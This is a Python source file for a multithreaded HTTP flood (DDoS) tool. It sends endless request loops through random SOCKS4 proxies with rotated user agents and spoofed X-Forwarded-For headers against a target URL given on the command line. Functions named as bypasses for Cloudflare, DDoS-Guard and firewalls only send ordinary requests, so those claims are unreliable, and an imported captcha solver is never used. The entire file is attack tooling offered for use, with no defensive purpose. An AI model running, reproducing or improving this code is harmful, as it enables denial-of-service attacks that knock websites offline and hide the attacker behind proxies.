import random
import requests
import socks
import socket
import sys
import time
import threading
from typing import List, Dict
from captcha_solver import solve_captcha 

logo = '''
  _________.__                           _____   __    __                 __    
 /   _____/|  |__ _____ _____________   /  _  \_/  |__/  |______    ____ |  | __
 \_____  \ |  |  \\__  \\_  __ \____ \ /  /_\  \   __\   __\__  \ _/ ___\|  |/ /
 /        \|   Y  \/ __ \|  | \/  |_> >    |    \  |  |  |  / __ \\  \___|    < 
/_______  /|___|  (____  /__|  |   __/\____|__  /__|  |__| (____  /\___  >__|_ \
        \/      \/     \/      |__|           \/                \/     \/     \/
'''

def load_proxies(file_path: str) -> List[Dict[str, str]]:
    proxies = []
    with open(file_path, "r") as file:
        for line in file:
            proxy = line.strip().split(":")
            if len(proxy) == 2:
                proxies.append({"host": proxy[0], "port": int(proxy[1])})
    return proxies

def load_user_agents(file_path: str) -> List[str]:
    with open(file_path, "r") as file:
        return [line.strip() for line in file]

def get_random_proxy(proxies: List[Dict[str, str]]) -> Dict[str, str]:
    return random.choice(proxies)

def get_random_user_agent(user_agents: List[str]) -> str:
    return random.choice(user_agents)

def bypass_cloudflare(target_url: str, proxies: List[Dict[str, str]], user_agents: List[str]):
    proxy = get_random_proxy(proxies)
    user_agent = get_random_user_agent(user_agents)

    socks.set_default_proxy(socks.SOCKS4, proxy["host"], proxy["port"])
    socket.socket = socks.socksocket

    try:
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }

        session = requests.Session()
        response = session.get(target_url, headers=headers, timeout=10)

        cookies = session.cookies.get_dict()

        response = session.get(target_url, headers=headers, cookies=cookies, timeout=10)
        print(f"Bypassed Cloudflare protection for {target_url} via {proxy['host']}:{proxy['port']}")
    except Exception as e:
        print(f"Failed to bypass Cloudflare protection: {e}")

def bypass_ddos_guard(target_url: str, proxies: List[Dict[str, str]], user_agents: List[str]):
    proxy = get_random_proxy(proxies)
    user_agent = get_random_user_agent(user_agents)

    socks.set_default_proxy(socks.SOCKS4, proxy["host"], proxy["port"])
    socket.socket = socks.socksocket

    try:
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }

        session = requests.Session()
        response = session.get(target_url, headers=headers, timeout=10)

        cookies = session.cookies.get_dict()

        response = session.get(target_url, headers=headers, cookies=cookies, timeout=10)
        print(f"Bypassed DDoS-Guard protection for {target_url} via {proxy['host']}:{proxy['port']}")
    except Exception as e:
        print(f"Failed to bypass DDoS-Guard protection: {e}")

def bypass_firewall(target_url: str, proxies: List[Dict[str, str]], user_agents: List[str]):
    proxy = get_random_proxy(proxies)
    user_agent = get_random_user_agent(user_agents)

    socks.set_default_proxy(socks.SOCKS4, proxy["host"], proxy["port"])
    socket.socket = socks.socksocket

    try:
        headers = {
            "User-Agent": user_agent,
            "X-Forwarded-For": proxy["host"],  
            "Referer": "https://google.com"   
        }
        response = requests.get(target_url, headers=headers, timeout=10)
        print(f"Bypassed Firewall protection for {target_url} via {proxy['host']}:{proxy['port']}")
    except Exception as e:
        print(f"Failed to bypass Firewall protection: {e}")

def bypass_http(target_url: str, proxies: List[Dict[str, str]], user_agents: List[str]):
    proxy = get_random_proxy(proxies)
    user_agent = get_random_user_agent(user_agents)

    socks.set_default_proxy(socks.SOCKS4, proxy["host"], proxy["port"])
    socket.socket = socks.socksocket

    try:
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        response = requests.get(target_url, headers=headers, timeout=10)
        print(f"Bypassed HTTP protection for {target_url} via {proxy['host']}:{proxy['port']}")
    except Exception as e:
        print(f"Failed to bypass HTTP protection: {e}")

def http_flood(target_url: str, proxies: List[Dict[str, str]], user_agents: List[str]):
    proxy = get_random_proxy(proxies)
    user_agent = get_random_user_agent(user_agents)

    socks.set_default_proxy(socks.SOCKS4, proxy["host"], proxy["port"])
    socket.socket = socks.socksocket

    try:
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        response = requests.get(target_url, headers=headers, timeout=10)
        print(f"HTTP flood request sent to {target_url} via {proxy['host']}:{proxy['port']}")
    except Exception as e:
        print(f"Failed to send HTTP flood request: {e}")

def attack_thread(target_url: str, proxies: List[Dict[str, str]], user_agents: List[str], attack_method: str, delay: int):
    while True:
        if attack_method == "http":
            bypass_http(target_url, proxies, user_agents)
        elif attack_method == "cloudflare":
            bypass_cloudflare(target_url, proxies, user_agents)
        elif attack_method == "firewall":
            bypass_firewall(target_url, proxies, user_agents)
        elif attack_method == "ddos-guard":
            bypass_ddos_guard(target_url, proxies, user_agents)
        elif attack_method == "http-flood":
            http_flood(target_url, proxies, user_agents)
        else:
            print("Invalid attack method. Available methods: http, cloudflare, firewall, ddos-guard, http-flood")
            sys.exit(1)

        time.sleep(delay / 1000)  

def main():
    if len(sys.argv) != 5:
        print(logo)
        print("Usage: python3 ddos_tool.py <target_url> <attack_method> <threads> <delay_ms>")
        print("Example: python3 run.py http://example.com cloudflare 10 100")
        print("Available attack methods: http, cloudflare, firewall, ddos-guard, http-flood")
        sys.exit(1)

    target_url = sys.argv[1]
    attack_method = sys.argv[2]
    threads = int(sys.argv[3])
    delay_ms = int(sys.argv[4])

    proxies = load_proxies("proxies.txt")
    user_agents = load_user_agents("user_agents.txt")

    print(f"Starting {attack_method} attack on {target_url} with {threads} threads and {delay_ms}ms delay...")
    for _ in range(threads):
        thread = threading.Thread(target=attack_thread, args=(target_url, proxies, user_agents, attack_method, delay_ms))
        thread.start()

if __name__ == "__main__":
    main()
